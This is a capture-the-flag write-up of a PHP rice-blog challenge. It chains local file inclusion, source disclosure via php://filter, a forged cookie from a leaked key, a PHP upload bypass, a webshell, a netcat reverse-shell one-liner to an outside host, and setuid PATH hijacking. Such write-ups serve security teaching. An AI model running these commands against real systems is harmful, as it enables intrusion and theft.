---
layout: post
title: 24H@CTF - Jamais Sans Mon Riz
categories:
  - polyctf
slug: polyctf-jamaissansmonriz
tags:
- linux
- privilege escalation
- lfi
- rce
- php
---
# Challenge Description

"Jamais sans mon riz" was the web track designed by [Desjardins](https://www.desjardins.com) at the 2022 edition of PolyHx's 24H@CTF

At the time or writing this, the challenge was still available at [http://www.jamaissansmonriz.com](http://www.jamaissansmonriz.com)

# Flag #1

We are presented with a blog about rice. I started by browsing the site manually. Quickly, something catches my attention: links to blog post are in the form of */post.php?postid=posts/1.php*.  This looks good for a potential LFI vulnerability.

I continued looking for the "classics" and found the first flag in the good old robots.txt

```
User-agent: * 
Disallow: /admin/

FLAG{1_dur_dur_detre_un_robot}
```

# Flag #2

Now that I have flag #1, I continued to look at source code and some other things without finding anything else useful, I went back to this potential LFI.

I started by trying to include a file that I know it exists and that I have read permission, robots.txt and it worked. The content of the file showed up in the source :

*/post.php?postid=robots.txt*

![lfi](/assets/img/polyctf-jamaissansmonriz/lfi1.png "lfi")

Then I tried to include passwd file which is outside the site root folder. Again, it worked :

*/post.php?postid=/etc/passwd*

![lfi2](/assets/img/polyctf-jamaissansmonriz/lfi2.png "lfi2")

Next thing I wanted to see was the site PHP source. But if I include the file through LFI, PHP code will be executed by the server so I wont be able to see what I want to see. So I used php filters to encode the content

*/post.php?postid=php://filter/convert.base64-encode/resource=index.php*

This will give me a base64 string which I decoded with :

```bash
echo 'BIGDIRTYBASE64STRING'|base64 -d > index.php
```

The decoded string is the actual PHP file. I remembered seeing an admin endpoint in the robots.txt file. I browsed to that endpoint and got redirected to /admin/login.php. By doing the same thing I did for index.php, I got the source for that login page.

At the top of the page were a comment with the second flag:

```php
<?php

// FLAG{2_je_me_sens_tellement_inclu}

include_once("lib/crypto.php");
session_start();

if(isset($_SESSION["admin"]) && $_SESSION["admin"]) {
    header("Location: /admin/index.php");
    exit();
}

// Validate Remember Me
if(isset($_COOKIE["remember_me"])) {
    if ($remember_me = validate_remember_me_cookie($_COOKIE["remember_me"])) {
        $_SESSION["admin"] = true;
        $_SESSION["username"] = "admin";
        header("Location: /admin/index.php");
        exit();
    }
}


// Validate login

if(isset($_POST["email"]) && isset($_POST["password"])) {
    // TODO: Ajouter une base de donnees, comme ca on ne riz plus
    if($_POST["email"] === "admin@jamaissansmonriz.com" && $_POST["password"] === getenv("FLAG4")) {
        
        $_SESSION["admin"] = true;
        $_SESSION["username"] = "admin";

        if(isset($_POST["remember_me"]) && $_POST["remember_me"] === "on") {
            setcookie("remember_me", generate_remember_me_cookie($_SESSION["username"], "1"), time()+3600*24*30, "/", "", 0);
        }   
        header("Location: /admin/index.php");
        exit();
    }
}
?>

```

We also have the code that validate the "remember me" cookie and the login validation itself. We know the admin email address and that the password is stored in an environment variable. We'll get back to this later.

# Flag #3

Let's go back to the source of login.php. 

The website does validate a "remember me" cookie :

```php
// Validate Remember Me
if(isset($_COOKIE["remember_me"])) {
    if ($remember_me = validate_remember_me_cookie($_COOKIE["remember_me"])) {
        $_SESSION["admin"] = true;
        $_SESSION["username"] = "admin";
        header("Location: /admin/index.php");
        exit();
    }
}
```

What this piece of code do is look for a cookie named "remember_me" and calls a function named "validate_remember_me_cookie". If the cookie is validated, the user's session is set to admin.

We can see in the source that it includes lib/crypto.php. Let's follow that trail and look at this one

*/post.php?postid=php://filter/convert.base64-encode/resource=admin/lib/crypto.php*

This one is interesting :

```php
<?php

$key = "5UP3R_S3CURE,K3Y";
$cipher="AES-128-CBC";

function generate_remember_me_cookie($username, $admin) {
    $iv = substr(md5(mt_rand()), 0, 16);
    $t = time() + (3600 * 24 * 365);
    $data = $username . "|" . $t . "|" . $admin;
    return base64_encode(encrypt($data, $iv) . "|" . $iv);
}

function validate_remember_me_cookie($cookie) {
    global $key, $cipher;
    try {
        $cookie_expended = explode("|", base64_decode($cookie));
        $decrypted_cookie = decrypt($cookie_expended[0], $cookie_expended[1]);
        
        if(!$decrypted_cookie) {
            return false;
        }

        $exp_d_cookie = explode("|", $decrypted_cookie);
        
        if ($exp_d_cookie[1] < time()) {
            return false;
        }
        // TODO: Ajouter des comptes user
        if ($exp_d_cookie[2] != "1") {
            return false;
        }
    } catch (Exception $e) {
        throw $e;
        return false;
    }

    return $exp_d_cookie;
}

function encrypt($data, $iv) {
    global $key, $cipher;
    // $ciphertext_raw = openssl_encrypt($data, $cipher, $key, 0, $iv);
    // return base64_encode(ciphertext_raw);
    return openssl_encrypt($data, $cipher, $key, 0, $iv);
}

function decrypt($cookie, $iv) {
    global $key, $cipher;
    // $ciphertext_raw = base64_decode($cookie);
    // return openssl_decrypt($ciphertext_raw, $cipher, $key, 0, $iv);
    return openssl_decrypt($cookie, $cipher, $key, 0, $iv);
}

?>
```

I quickly realised that the functions in this file are the ones responsible for generating and validating "remember me" cookie. Both the key and the cipher used are also there. I had everything I needed to craft myself a cookie.

I started by launching a php-cli container and copied the file content (without the first and last lines) in the console to load the functions :

```bash
$ docker run --rm -it php 
Interactive shell

php > $key = "5UP3R_S3CURE,K3Y";
$cipher="AES-128-CBC";

function generate_remember_me_cookie($username, $admin) {
    $iv = substr(md5(mt_rand()), 0, 16);
    $t = time() + (3600 * 24 * 365);
    $data = $username . "|" . $t . "|" . $admin;
[...]

php > echo generate_remember_me_cookie('admin',1);
RVVCK1I1WFFwN3k3a2lRTW1tN1pBSm5WZHRod2pmS1Y2eEtmVnR4Wmd5RT18OGNjNDY4MWE3ZDVmNTg4Nw==
```

Now all I had to do is set this cookie in my browser to access the admin page :

I browsed to /admin/login.php, opened developper tools (f12), go to console tab and run the command:

```js
document.cookie='remember_me=RVVCK1I1WFFwN3k3a2lRTW1tN1pBSm5WZHRod2pmS1Y2eEtmVnR4Wmd5RT18OGNjNDY4MWE3ZDVmNTg4Nw=='
```

When the page is reloaded, we're in the admin dashboard:

![flag3](/assets/img/polyctf-jamaissansmonriz/admin-flag3.png "flag3")

# Flag #4

I already know that the 4th flag is in an environment variable. I must find a way to access those variables.

I tried to get RCE through log poisoning but I couldn't access any log file. There must be another way to get RCE. I also tried to access the environment variable from /proc/self/environ with no luck.

I started by browsing the admin dashboard and found a file upload page. Thanks to LFI, we can see the code that's responsible for the upload :

*/post.php?postid=php://filter/convert.base64-encode/resource=admin/upload.php*

```php
<?php
    if (isset($_FILES['file'])) {
        $uploaddir = '/var/www/uploads/' . session_id() . '/';
        $path_parts = pathinfo($_FILES['file']['name']);
        $filename = $path_parts['basename'];
        $valid_ext = ["jpg", "png"];
        if(in_array($path_parts['extension'], $valid_ext, true)) {
            if (!file_exists($uploaddir)) {
                mkdir($uploaddir, 0755, true);
            }
            $uploadfile = $uploaddir . $filename;
            
            if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
                echo '<div class="alert alert-success" role="alert"> File is valid, and was successfully and securely uploaded.</div>';
            } else {
                echo '<div class="alert alert-danger" role="alert">What did you do... I\'m not mad, I\'m just disappointed...</div>';
            }
        } else {
            echo '<div class="alert alert-danger" role="alert">What did you do... I\'m not mad, I\'m just disappointed...</div>';
        }
    }
?>
```

By analysing the code, I can tell that the only validation that's done on the uploaded file is an extension check and that the file is saved in uploads/sessionsid/file.png. We should be able to run some PHP code

I fired up Burp Suite to edit the upload POST request to remove the image and include some PHP code :

![burpupload1](/assets/img/polyctf-jamaissansmonriz/burp-upload.png "burpupload1")

With my file uploaded, I should be able to get to it using LFI :

*/post.php?postid=../uploads/c26452f59a9ce0ef22dd3a400aed40c2/cochondinde.jpg*

![rce](/assets/img/polyctf-jamaissansmonriz/rce.png "rce")

Yay! The next thing I did was to upload a proper webshell. I used this one. To do this, I just repeated my first upload POST in Burp Suite and replaced the code with the webshell.

![burpshell](/assets/img/polyctf-jamaissansmonriz/burp-uploadshell.png "burpshell")

I went back to my browser and refresh the page to get my shell and the 4th flag :

![webshell](/assets/img/polyctf-jamaissansmonriz/webshell.png "webshell")

# Flag #5

The 4th flag is asking us to become root. Let's do that.

With a working webshell, I should be able to get a proper reverse shell by running the following command:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc vps_hostname 4444 >/tmp/f
```

I now have a reverse shell as www-data user. Next, I started to look for privilege escalation vector. I looked for the classic vectors :

- cron jobs
- writable folder
- suid binaries

Then I found a suid binary right at server root :

```bash
$ ls -la /
total 112
drwxr-xr-x   1 root root  4096 Feb 16 13:44 .
drwxr-xr-x   1 root root  4096 Feb 16 13:44 ..
-rwxr-xr-x   1 root root     0 Feb 16 13:44 .dockerenv
drwxr-xr-x   1 root root  4096 Feb 16 13:14 bin
drwxr-xr-x   2 root root  4096 Feb  1  2020 boot
drwxr-xr-x   5 root root   340 Feb 16 13:44 dev
drwxr-xr-x   1 root root  4096 Feb 16 13:44 etc
drwxr-xr-x   1 root root  4096 Feb  9 04:23 home
drwxr-xr-x   1 root root  4096 Feb 26  2020 lib
drwxr-xr-x   2 root root  4096 Feb 24  2020 lib64
drwxr-xr-x   2 root root  4096 Feb 24  2020 media
drwxr-xr-x   2 root root  4096 Feb 24  2020 mnt
-rw-r--r--   1 root root   127 Feb  9 03:50 my_very_special_script.c
-rwsr-sr-x   1 root root 16680 Feb 16 13:14 my_very_special_script.o
drwxr-xr-x   2 root root  4096 Feb 24  2020 opt
dr-xr-xr-x 439 root root     0 Feb 16 13:44 proc
drwx------   1 root root  4096 Feb 26  2020 root
drwxr-xr-x   1 root root  4096 Feb 26  2020 run
drwxr-xr-x   1 root root  4096 Feb 26  2020 sbin
drwxr-xr-x   2 root root  4096 Feb 24  2020 srv
dr-xr-xr-x  13 root root     0 Feb 15 13:29 sys
drwxrwxrwt   1 root root  4096 Feb 16 13:44 tmp
drwxr-xr-x   1 root root  4096 Feb 24  2020 usr
drwxr-xr-x   1 root root  4096 Feb 26  2020 var
```

We have an executable file and the source code :

```bash
$ cat /my_very_special_script.c

#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(1000);
    system("touch /tmp/hello_world");
    return 0; 
}
```

I immediately spooted the "pathless" call to touch. The fact that "touch" is called without a full path means that I should be able to add a folder to my PATH and hijack the real "touch" with a custom script :

First, I tested the theory :

```bash
$ mkdir /tmp/h3xit
$ cd /tmp/h3xit
$ export PATH=/tmp/h3xit:$PATH
$ which touch
/usr/bin/touch
$ echo 'echo "path manipulation ftw"' > touch           
$ chmod +x touch
$ which touch
/tmp/touch
$ touch
path manipulation ftw
```

It worked, so let's setup the real thing :

```bash
$ echo -e '#!/bin/bash\n/bin/bash' > touch
$ cat touch
#!/bin/bash
/bin/bash
$ chmod +x touch
$ /my_very_special_script.o
id
uid=1000(admin) gid=33(www-data) groups=33(www-data)
$ ls -l /home/admin
total 4
-rw-r--r-- 1 root root 35 Feb  9 04:23 flag.txt
$ cat /home/admin/flag.txt
FLAG{5_la_track_est_enfin_finie_gj}
```

Thanks for reading <3

h3x
